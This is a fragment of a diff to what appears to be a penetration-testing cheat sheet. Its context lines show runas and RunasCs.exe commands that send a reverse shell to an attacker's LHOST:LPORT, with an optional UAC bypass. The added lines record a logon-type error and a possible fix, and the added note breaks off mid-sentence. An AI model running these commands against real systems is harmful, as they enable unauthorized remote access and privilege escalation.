@@ -22,6 +22,9 @@ runas /user:<domain>\<user> powershell.exe -e <base64_revshell>
 RunasCs.exe 
 ```powershell
 .\RunasCs.exe <user> <password> powershell -r <LHOST>:<LPORT> [--bypass-uac]
+
+# [-] RunasCsException: Selected logon type '2' is not granted to the user 'JDgodd'. Use available logon type '3'.
+--remote-impersonation -l 3 # MIGHT solve this. Not guarenteed. Consider 
 ```
 #### Powershell
 First spawn a powershell interactive shell
